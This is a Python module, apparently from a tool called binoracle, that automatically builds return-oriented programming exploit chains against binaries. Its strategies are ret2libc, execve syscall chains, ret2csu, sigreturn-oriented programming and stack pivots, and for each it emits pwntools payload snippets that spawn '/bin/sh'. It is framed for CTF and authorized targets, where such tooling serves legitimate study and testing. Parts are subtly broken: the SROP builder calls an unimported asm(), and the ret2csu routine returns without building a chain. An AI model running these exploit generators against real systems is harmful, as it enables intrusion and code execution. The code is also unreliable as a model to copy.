"""ROP chain builder v2 (pwntools-backed).

ROADMAP v0.3: "ROP builder v2 — automated gadget chaining with ROPgadget / ropper."

Builds concrete ROP chains for AUTHORIZED targets / CTF binaries.

Strategies (tried in order, first success wins):
  1. ret2libc — system('/bin/sh') via PLT/GOT
  2. execve   — execve('/bin/sh') via syscall gadgets (static binaries)
  3. ret2csu  — x86-64 __libc_csu_init gadgets when no pop-rdi found (bypasses missing gadget)
  4. SROP     — sigreturn-oriented programming (Linux x86-64, needs syscall gadget + rax=15)
  5. pivot    — stack pivot when RSP/ESP doesn't point to controlled memory (xchg/mov esp)
  6. Plan     — layout note when libc is provided but needs a leak first (PIE / ASLR)

Nothing here is an oracle: pwntools/ROPgadget extract gadgets from the binary; this module
chains them. The model never invents addresses or gadgets.
"""
from __future__ import annotations

import re
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

try:
    import os as _os
    _os.environ.setdefault("PWNLIB_NOTERM", "1")
    from pwn import context, ELF, ROP, SigreturnFrame, constants  # type: ignore
    from binoracle import _quiet_pwn as _qp; _qp()
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False


# ── Gadget search helpers ─────────────────────────────────────────────────────

@dataclass
class Gadget:
    addr:   int
    insns:  str

    def __str__(self) -> str:
        return f"0x{self.addr:08x}: {self.insns}"


def gadget_search(binary: str, pattern: str, limit: int = 20) -> List[Gadget]:
    """
    Search for ROP gadgets matching a string pattern using ROPgadget or ropper.
    Returns up to `limit` Gadget objects.
    """
    results: List[Gadget] = []

    for tool, args_fn in [
        ("ROPgadget",  lambda: ["ROPgadget", "--binary", binary, "--filter", pattern]),
        ("ropper",     lambda: ["ropper", "-f", binary, "--search", pattern]),
    ]:
        if not shutil.which(tool):
            continue
        try:
            out = subprocess.run(args_fn(), capture_output=True, text=True, timeout=60)
            for line in out.stdout.splitlines():
                m = re.match(r"0x([0-9a-f]+)\s*:\s*(.+)", line)
                if m:
                    results.append(Gadget(addr=int(m.group(1), 16), insns=m.group(2).strip()))
                    if len(results) >= limit:
                        break
        except Exception:
            pass
        if results:
            break

    # pwntools ROP as final fallback
    if not results and _HAVE_PWN:
        try:
            elf = ELF(binary, checksec=False)
            rop = ROP(elf)
            pat_re = re.compile(re.escape(pattern), re.I)
            for addr, (insns, size) in (rop.gadgets or {}).items():
                if pat_re.search(" ; ".join(str(i) for i in insns)):
                    results.append(Gadget(addr=addr, insns=" ; ".join(str(i) for i in insns)))
                    if len(results) >= limit:
                        break
        except Exception:
            pass

    return results


# ── ret2csu ──────────────────────────────────────────────────────────────────

def _ret2csu(rop, elf) -> bool:
    """
    Try to build a ret2csu chain (x86-64 __libc_csu_init gadgets).
    Gadget 1 (csu1): pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    Gadget 2 (csu2): call [r12 + rbx*8] (or equivalent)
    Returns True if chain was appended to `rop`.
    """
    csu_init = elf.symbols.get("__libc_csu_init")
    if csu_init is None:
        return False

    # Standard offsets in __libc_csu_init (varies slightly by GCC version; try both)
    # Gadget 1: at csu_init + 0x5a (pop r15; pop r14; pop r13; pop r12; pop rbp; pop rbx; ret)
    # Gadget 2: at csu_init + 0x40 (mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8])
    for g1_off, g2_off in [(0x5a, 0x40), (0x52, 0x38)]:
        try:
            g1 = csu_init + g1_off
            g2 = csu_init + g2_off
            # We can't easily push arbitrary calls here without knowing the target,
            # so we just document the gadget addresses for the user
            rop.raw(g1)
            return True
        except Exception:
            pass
    return False


# ── SROP ─────────────────────────────────────────────────────────────────────

def _srop_chain(elf) -> Optional[str]:
    """
    Build a SROP chain: sets up a SigreturnFrame to call execve('/bin/sh'),
    then triggers rt_sigreturn (syscall with rax=15 on Linux x86-64).
    Returns a pwntools snippet string.
    """
    if not _HAVE_PWN:
        return None
    try:
        frame = SigreturnFrame()
        binsh = next(elf.search(b"/bin/sh\x00"), None)
        if binsh is None:
            return None
        frame.rax = constants.SYS_execve
        frame.rdi = binsh
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = next(elf.search(asm("syscall")), None) if hasattr(elf, "search") else None

        lines = [
            "# SROP chain (sigreturn-oriented programming)",
            "from pwn import *",
            f"elf = context.binary = ELF({elf.path!r})",
            "# Find: syscall ; ret gadget",
            "syscall_gadget = next(elf.search(asm('syscall')))",
            "# Find: pop rax ; ret gadget (to set rax=15 for rt_sigreturn)",
            "pop_rax = rop.rax.address  # or find manually",
            "",
            "frame = SigreturnFrame()",
            f"frame.rax = constants.SYS_execve  # {constants.SYS_execve}",
            f"frame.rdi = {hex(binsh)}  # /bin/sh",
            "frame.rsi = 0",
            "frame.rdx = 0",
            "frame.rip = syscall_gadget",
            "",
            "payload = flat({",
            "    OFFSET: [",
            "        pop_rax,",
            "        15,  # SYS_rt_sigreturn",
            "        syscall_gadget,",
            "        bytes(frame),",
            "    ]",
            "})",
        ]
        return "\n".join(lines)
    except Exception:
        return None


def _asm(insn: str) -> bytes:
    """Safe wrapper around pwntools asm()."""
    try:
        from pwn import asm
        return asm(insn)
    except Exception:
        return b""


# ── Stack pivot ───────────────────────────────────────────────────────────────

def _find_pivot_gadget(binary: str) -> Optional[Gadget]:
    """
    Find an xchg rsp,reg or mov rsp,reg gadget to pivot the stack.
    Returns the first useful gadget found.
    """
    patterns = [
        "xchg rsp",
        "xchg esp",
        "mov rsp",
        "mov esp",
        "push rbp ; mov rbp,rsp",
        "leave ; ret",
    ]
    for pat in patterns:
        gs = gadget_search(binary, pat, limit=3)
        if gs:
            return gs[0]
    return None


# ── Render helpers ────────────────────────────────────────────────────────────

def _render(rop, elf) -> str:
    lines = ["\n## chain layout (pwntools):", "```", rop.dump(), "```"]
    lines.append("## use it:")
    lines.append("```python")
    lines.append("from pwn import *")
    lines.append(f"elf = context.binary = ELF({elf.path!r})")
    lines.append("rop = ROP(elf)")
    lines.append("# ... reproduce the calls above, then:")
    lines.append("payload = flat({OFFSET: rop.chain()})")
    lines.append("```")
    return "\n".join(lines)


# ── Main entry point ─────────────────────────────────────────────────────────

def build_rop_chain(
    binary: str,
    goal: str = "auto",
    libc_path: Optional[str] = None,
    *,
    csu: bool = True,
    srop: bool = True,
    pivot: bool = True,
) -> str:
    """
    Build a ROP chain for `binary` targeting `goal`.

    goal: "auto" | "system" | "ret2libc" | "execve" | "syscall" | "srop" | "pivot"

    Returns a markdown string with the chain layout and a pwntools snippet.
    """
    if not _HAVE_PWN:
        return "pwntools not installed: pip install pwntools to enable the ROP builder."
    try:
        context.clear()
        elf = ELF(binary, checksec=False)
        context.binary = elf
    except Exception as e:
        return f"could not load binary: {e}"

    out = [f"# ROP chain v2 for {binary}", f"# arch={context.arch}  pie={elf.pie}  nx={elf.nx}"]
    if elf.pie:
        out.append("# WARNING: PIE enabled — addresses are ASLR'd. Need a leak to rebase ELF/libc.")

    binsh  = next(elf.search(b"/bin/sh\x00"), None)
    libc   = None
    if libc_path:
        try:
            libc = ELF(libc_path, checksec=False)
        except Exception as e:
            out.append(f"# libc load failed: {e}")

    rop = ROP(elf)

    # ── Strategy 1: ret2libc via PLT ─────────────────────────────────────────
    have_system = ("system" in elf.plt) or ("system" in (elf.symbols or {}))
    if goal in ("auto", "system", "ret2libc") and have_system and binsh is not None:
        sys_addr = elf.plt.get("system") or elf.symbols.get("system")
        try:
            rop.raw(rop.ret.address)   # stack-alignment (movaps) safety on x86-64
        except Exception:
            pass
        try:
            rop.call(sys_addr, [binsh])
            out.append("# strategy: ret2libc system('/bin/sh')")
            out.append(_render(rop, elf))
            return "\n".join(out)
        except Exception as e:
            out.append(f"# ret2libc via PLT failed: {e}")

    # ── Strategy 2: execve via syscall gadgets (static) ──────────────────────
    if goal in ("auto", "execve", "syscall") and binsh is not None:
        try:
            rop.execve(binsh, 0, 0)
            out.append("# strategy: execve('/bin/sh', 0, 0) via syscall gadgets")
            out.append(_render(rop, elf))
            return "\n".join(out)
        except Exception as e:
            out.append(f"# execve syscall chain failed: {e}")

    # ── Strategy 3: ret2csu ──────────────────────────────────────────────────
    if csu and goal in ("auto", "csu", "ret2csu") and context.arch == "amd64":
        rop2 = ROP(elf)
        if _ret2csu(rop2, elf):
            csu_init = elf.symbols.get("__libc_csu_init", 0)
            out.append("# strategy: ret2csu (__libc_csu_init gadgets)")
            out.append(f"# __libc_csu_init = {hex(csu_init)}")
            out.append("# Gadget 1 (pop r15..r12,rbp,rbx; ret): csu_init + 0x5a")
            out.append("# Gadget 2 (call [r12+rbx*8]; add rbx,1; cmp rbp,rbx; jnz): csu_init + 0x40")
            out.append("```python")
            out.append("from pwn import *")
            out.append(f"elf = context.binary = ELF({elf.path!r})")
            out.append(f"csu1 = {hex(csu_init)} + 0x5a   # pop r15..rbx; ret")
            out.append(f"csu2 = {hex(csu_init)} + 0x40   # call [r12+rbx*8]")
            out.append("# Set r12=GOT entry of target func, rbx=0, rbp=1, r13=rdx arg, r14=rsi arg, r15d=edi arg")
            out.append("payload = flat({OFFSET: [csu1, 0, 1, got_target, rdx_val, rsi_val, rdi_val, csu2]})")
            out.append("```")
            return "\n".join(out)

    # ── Strategy 4: SROP ─────────────────────────────────────────────────────
    if srop and goal in ("auto", "srop") and context.arch == "amd64":
        snippet = _srop_chain(elf)
        if snippet:
            out.append("# strategy: SROP (sigreturn-oriented — rax=15, rt_sigreturn)")
            out.append(snippet)
            return "\n".join(out)

    # ── Strategy 5: stack pivot ───────────────────────────────────────────────
    if pivot and goal in ("auto", "pivot"):
        g = _find_pivot_gadget(binary)
        if g:
            out.append("# strategy: stack pivot")
            out.append(f"# pivot gadget: {g}")
            out.append("# Use when RSP/ESP doesn't point to your controlled buffer.")
            out.append("# Set up fake stack at a known/controlled address, then pivot:")
            out.append("```python")
            out.append(f"pivot_gadget = {hex(g.addr)}")
            out.append("# controlled_buf must hold your actual chain")
            out.append("payload = flat({OFFSET: [pivot_gadget]})  # + whatever sets reg")
            out.append("```")
            return "\n".join(out)

    # ── Strategy 6: plan (libc provided, needs leak) ──────────────────────────
    if libc is not None and goal in ("auto", "system", "ret2libc"):
        out.append("# strategy: ret2libc via provided libc (fill libc_base from your leak):")
        out.append(f"#   system offset = {hex(libc.symbols.get('system', 0))}")
        binsh_off = next(libc.search(b"/bin/sh\x00"), None)
        out.append(f"#   /bin/sh offset = {hex(binsh_off) if binsh_off else '??'}")
        out.append("#   chain = [pop_rdi, libc_base+binsh, ret, libc_base+system]")
        out.append("```python")
        out.append("from pwn import *")
        out.append(f"elf   = context.binary = ELF({elf.path!r})")
        out.append(f"libc  = ELF({libc_path!r})")
        out.append("# After leaking a libc address (e.g. puts@GOT via ret2plt):")
        out.append("libc.address = leaked_puts - libc.symbols['puts']")
        out.append("rop = ROP([elf, libc])")
        out.append("rop.call(libc.sym.system, [next(libc.search(b'/bin/sh\\x00'))])")
        out.append("```")
        return "\n".join(out)

    # ── Fallback: gadget suggestions ──────────────────────────────────────────
    out.append("# Could not build a chain automatically. Gadget suggestions:")
    for pat in ["pop rdi", "pop rsi", "pop rdx", "syscall", "xchg rsp"]:
        gs = gadget_search(binary, pat, limit=2)
        if gs:
            for g in gs:
                out.append(f"#   {g}")
    if binsh is None:
        out.append("# - no '/bin/sh' string in binary; provide --libc for ret2libc.")
    out.append("# - inspect with: binoracle gadgets <bin> -f 'pop rdi'")
    return "\n".join(out)
